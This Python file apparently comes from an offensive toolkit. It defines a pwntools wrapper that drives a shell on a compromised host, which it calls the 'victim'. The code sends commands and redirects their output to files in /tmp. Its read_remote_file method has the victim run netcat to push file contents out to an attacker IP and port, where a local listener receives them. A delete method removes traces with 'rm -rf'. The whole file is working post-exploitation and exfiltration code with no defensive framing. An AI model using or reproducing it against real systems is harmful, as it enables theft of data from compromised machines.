import hashlib
import pwn
from pwnlib.tubes.sock import sock

class PwnlibSocketWrapper:
    def __init__(self, client: sock, expected_prompt: str, attacker_ip: str):
        self.client = client
        self.expected_prompt = expected_prompt
        self.attacker_ip = attacker_ip
        self.timeout = 1
        self.encoding = 'utf-8'
        self.remote_output_folder = '/tmp/'
        self.netcat_file_transfer_port = 9002
        self.newline_bytes = b'\n'

    def send_command_read_output(self, command_bytes: bytes, expect_single_line_output=False) -> str:
        self.client.recvuntil(self.expected_prompt)
        self.client.sendline(command_bytes)
        self.client.recvuntil(command_bytes + self.newline_bytes)

        output = ''
        while True:
            output_line = self.client.recvuntil(self.newline_bytes, timeout=self.timeout).decode(self.encoding)
            output += output_line

            if not output_line or expect_single_line_output:
                break

        return output.strip()

    def send_command_redirected_to_temporary_file(self, command_bytes: bytes) -> str:
        _hash = hashlib.md5(command_bytes).hexdigest()
        output_remote_temporary_file = self.remote_output_folder + _hash

        if self.remote_file_exists(output_remote_temporary_file):
            return output_remote_temporary_file

        command_str = command_bytes.decode(self.encoding)
        redirected_command_bytes = f'{command_str} > {output_remote_temporary_file} 2>&1'.encode()
        self.client.sendline(redirected_command_bytes)

        return output_remote_temporary_file

    def read_remote_file(self, remote_path: str, wait_before_upload_seconds: int=3) -> str:
        download_command = f'sleep {wait_before_upload_seconds} && nc -w 3 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
        self.client.sendline(download_command)

        # TODO: run listen on separate thread before running nc on victim
        downloaded_output = None
        with pwn.listen(self.netcat_file_transfer_port).wait_for_connection() as client:
            downloaded_output = client.recvall().strip()

        return downloaded_output.decode(self.encoding)

    def delete_remote_file(self, remote_path: str):
        remove_command = f'rm -rf {remote_path}'.encode()
        self.client.sendline(remove_command)

    def remote_file_exists(self, remote_path: str) -> bool:
        file_exists_command = f'file {remote_path}'.encode()
        output = self.send_command_read_output(file_exists_command, expect_single_line_output=True)
        return 'No such file or directory' not in output and ': empty' not in output

    def send_command_read_output_through_temporary_file(self, command_bytes: bytes) -> str:
        remote_temporary_file = self.send_command_redirected_to_temporary_file(command_bytes)
        output = self.read_remote_file(remote_temporary_file)
        return output
